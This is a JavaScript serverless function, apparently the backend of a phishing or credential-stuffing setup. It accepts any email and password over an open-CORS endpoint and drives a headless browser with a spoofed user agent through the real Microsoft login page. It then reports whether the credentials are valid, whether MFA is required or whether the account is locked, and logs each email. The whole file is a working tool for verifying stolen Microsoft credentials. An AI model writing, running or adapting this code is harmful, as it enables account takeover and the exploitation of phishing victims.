/**
 * REAL Microsoft Password Validation Function
 * Validates credentials against real Microsoft login using Puppeteer.
 * Updated: 2025-11-10 15:04:43 UTC by pixelogicm
 */

const puppeteer = require('puppeteer');

exports.handler = async (event, context) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Content-Type': 'application/json'
  };

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }

  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' })
    };
  }

  try {
    const { email, password } = JSON.parse(event.body);
    
    if (!email || !password) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ 
          valid: false, 
          error: 'Email and password required' 
        })
      };
    }

    console.log(`🔐 [${new Date().toISOString()}] REAL VALIDATION for: ${email}`);

    const browser = await puppeteer.launch({
      headless: true,
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-gpu',
        '--single-process' // May help on limited environments
      ]
    });

    const page = await browser.newPage();
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36');
    await page.setViewport({ width: 1280, height: 800 });

    let validationResult = {
      valid: false,
      reason: 'Unknown login failure',
      mfaRequired: false,
      accountLocked: false
    };

    try {
      // Navigate to Microsoft login
      await page.goto('https://login.microsoftonline.com/common/oauth2/v2.0/authorize?scope=openid&client_id=12345&redirect_uri=https://localhost/&response_type=code', {
        waitUntil: 'networkidle2',
        timeout: 20000
      });

      // Enter email
      await page.waitForSelector('input[type="email"], input[name="loginfmt"]', { timeout: 10000 });
      await page.type('input[type="email"], input[name="loginfmt"]', email, { delay: 50 });
      await page.keyboard.press('Enter');

      // Wait for the next page to load
      await page.waitForTimeout(2500);

      // Check for "account doesn't exist" error
      const usernameError = await page.$('div[id*="usernameError"]');
      if (usernameError) {
        validationResult.reason = "Account doesn't exist";
        throw new Error("Account doesn't exist");
      }

      // Enter password
      await page.waitForSelector('input[type="password"], input[name="passwd"]', { timeout: 10000 });
      await page.type('input[type="password"], input[name="passwd"]', password, { delay: 50 });
      
      // Click sign in and wait for navigation
      await Promise.all([
        page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 15000 }),
        page.keyboard.press('Enter')
      ]).catch(e => console.log('Navigation promise failed, but continuing...')); // Continue even if timeout

      // --- Check for login result ---
      const pageUrl = page.url();

      // 1. SUCCESS: "Stay signed in?" page (KMSI)
      if (await page.$('input[id*="KmsiCheckboxField"]')) {
        validationResult.valid = true;
        validationResult.reason = "Valid credentials";
        console.log(`✅ Valid credentials for: ${email}`);
      }
      
      // 2. SUCCESS: MFA / 2FA prompt
      else if (pageUrl.includes('/SAS/ProcessAuth') || await page.$('div[id*="twoFactorAuth"]') || await page.$('[data-testid="idRichContext_DisplaySign"]')) {
        validationResult.valid = true;
        validationResult.mfaRequired = true;
        validationResult.reason = "Valid - MFA required";
        console.log(`✅ Valid credentials (MFA required): ${email}`);
      }

      // 3. FAILURE: Incorrect password error
      else if (await page.$('div[id*="passwordError"]')) {
        validationResult.reason = "Incorrect password";
        console.log(`❌ Invalid password for: ${email}`);
      }

      // 4. FAILURE: Account locked
      else if (await page.evaluate(() => document.body.innerText.includes("Your account has been locked"))) {
          validationResult.accountLocked = true;
          validationResult.reason = "Account locked";
          console.log(`🔒 Account locked: ${email}`);
      }
      
    } catch (error) {
      console.error(`❌ Validation Puppeteer error for ${email}:`, error.message);
      if (!validationResult.reason) {
        validationResult.reason = `Validation error: ${error.message.substring(0, 50)}...`;
      }
    }

    await browser.close();

    console.log(`📊 FINAL Validation result for ${email}:`, validationResult);

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify(validationResult)
    };

  } catch (error) {
    console.error('❌ Microsoft validation handler error:', error);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        valid: false,
        error: error.message,
        reason: "Server handler error"
      })
    };
  }
};